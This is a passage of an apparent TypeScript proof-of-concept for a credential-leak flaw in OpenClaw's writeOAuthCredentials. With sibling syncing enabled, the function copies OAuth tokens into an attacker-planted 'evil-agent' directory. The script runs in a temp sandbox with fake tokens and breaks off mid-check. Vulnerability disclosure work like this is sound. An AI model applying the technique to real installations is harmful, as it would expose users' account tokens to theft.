import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

// ---------------------------------------------------------------------------
// 1. Build isolated tmp workspace mirroring ~/.openclaw/agents layout
// ---------------------------------------------------------------------------
const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "h18-poc-"));
const agentsRoot = path.join(tmpRoot, "agents");

// Legitimate primary agent dir (simulates the real victim agent)
const primaryAgentDir = path.join(agentsRoot, "primary-agent", "agent");

// Attacker-planted sibling dir – no privileges required, just mkdir
const evilAgentDir = path.join(agentsRoot, "evil-agent", "agent");

fs.mkdirSync(primaryAgentDir, { recursive: true });
fs.mkdirSync(evilAgentDir, { recursive: true });

console.log("[PoC] Tmp workspace:", tmpRoot);
console.log("[PoC] Primary agent dir:", primaryAgentDir);
console.log("[PoC] Evil-agent dir (attacker-planted):", evilAgentDir);

// ---------------------------------------------------------------------------
// 2. Redirect state dir so real production helpers resolve into our tmp space
//    (provider-auth-helpers calls resolveStateDir from config/paths)
// ---------------------------------------------------------------------------
process.env["OPENCLAW_STATE_DIR"] = tmpRoot;

// Also create a minimal agents layout the state-dir path helpers expect
fs.mkdirSync(path.join(tmpRoot, "agents"), { recursive: true });

// ---------------------------------------------------------------------------
// 3. Import the real production function under test
// ---------------------------------------------------------------------------
const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "./../../..");

// Dynamic import after env setup so paths.ts picks up OPENCLAW_STATE_DIR
const { writeOAuthCredentials } = await import(
  path.join(repoRoot, "src/plugins/provider-auth-helpers.ts")
);

// ---------------------------------------------------------------------------
// 4. Call writeOAuthCredentials with syncSiblingAgents:true
//    Simulates the OAuth refresh cycle in oauth-manager.ts:452
// ---------------------------------------------------------------------------
const fakeOAuthCreds = {
  email: "victim@example.com",
  accessToken: "ACCESS_TOKEN_SECRET_abc123",
  refreshToken: "REFRESH_TOKEN_SECRET_xyz789",
  expires: Date.now() + 3600_000,
  scopes: ["openid", "email"],
};

console.log("[PoC] Calling writeOAuthCredentials(syncSiblingAgents:true) ...");

await writeOAuthCredentials(
  "anthropic",
  fakeOAuthCreds,
  primaryAgentDir,
  { syncSiblingAgents: true, profileName: "victim-profile" },
);

// ---------------------------------------------------------------------------
// 5. Verify the credential was broadcast to the evil-agent dir
// ---------------------------------------------------------------------------
const evilAuthFile = path.join(evilAgentDir, "auth-profiles.json");
const primaryAuthFile = path.join(primaryAgentDir, "auth-profiles.json");

const primaryExists = fs.existsSync(primaryAuthFile);
const evilExists = fs.existsSync(evilAuthFile);

console.log("[PoC] Primary auth-profiles.json written:", primaryExists);
console.log("[PoC] Evil-agent auth-profiles.json written:", evilExists);

let evidenceMarker = "NOT_OBSERVED";
let status: "confirmed" | "failed" | "inconclusive" = "failed";

if (evilExists) {
  const evilStore = JSON.parse(fs.readFileSync(evilAuthFile, "utf8"));
  const profiles = evilStore.profiles ?? {};
  const profileIds = Object.keys(profiles);
  const stolen = profileIds.find((id) =>
    profiles[id]?.accessToken === fakeOAuthCreds.accessToken ||
